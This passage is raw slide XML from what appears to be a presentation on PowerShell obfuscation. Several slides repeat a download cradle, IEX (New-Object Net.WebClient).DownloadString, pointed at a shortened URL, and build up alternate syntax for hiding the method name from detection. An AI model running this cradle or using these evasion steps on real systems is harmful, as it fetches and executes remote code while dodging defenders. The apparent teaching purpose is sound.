                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cmdlets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Methods</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Members</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Properties</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0" smtClean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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673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07061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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Method Obfuscation – Alternate syntax to obtain method name as a String</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="43088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200" dirty="0" smtClean="0"/>
              <a:t>IEX (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200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307029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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Method Obfuscation – Alternate syntax to obtain method name as a String</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="43088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200" dirty="0" smtClean="0"/>
              <a:t>IEX (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill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68160" y="3598373"/>
            <a:ext cx="6655680" cy="2578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43746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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Method Obfuscation – Alternate syntax to obtain method name as a String</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>) | Get-Member</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="43088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200" dirty="0" smtClean="0"/>
              <a:t>IEX (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/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4360" y="3816616"/>
            <a:ext cx="8583277" cy="2273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9148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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Method Obfuscation – Alternate syntax to obtain method name as a String</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="43088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200" dirty="0" smtClean="0"/>
              <a:t>IEX (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill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68160" y="3598373"/>
            <a:ext cx="6655680" cy="2578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97310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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Method Obfuscation – Alternate syntax to obtain method name as a String</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> | Where-Object {$_.Name -like '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="43088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200" dirty="0" smtClean="0"/>
              <a:t>IEX (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill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2864" y="3960421"/>
            <a:ext cx="11229995" cy="1376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06587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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Method Obfuscation – Alternate syntax to obtain method name as a String</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> | Where-Object {$_.Name -like '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>).Name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="43088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200" dirty="0" smtClean="0"/>
              <a:t>IEX (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/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4419" y="3962402"/>
            <a:ext cx="11126097" cy="624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05493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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Method Obfuscation – Alternate syntax to obtain method name as a String</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>((New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> | Where-Object {$_.Name -like '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'}).Name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="43088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200" dirty="0" smtClean="0"/>
              <a:t>IEX (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill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799" y="4576899"/>
            <a:ext cx="10058400" cy="363041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9" name="Up Arrow 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="1974546" y="3583258"/>
            <a:ext cx="412323" cy="932006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34878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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Method Obfuscation – Alternate syntax to obtain method name as a String</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>((New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
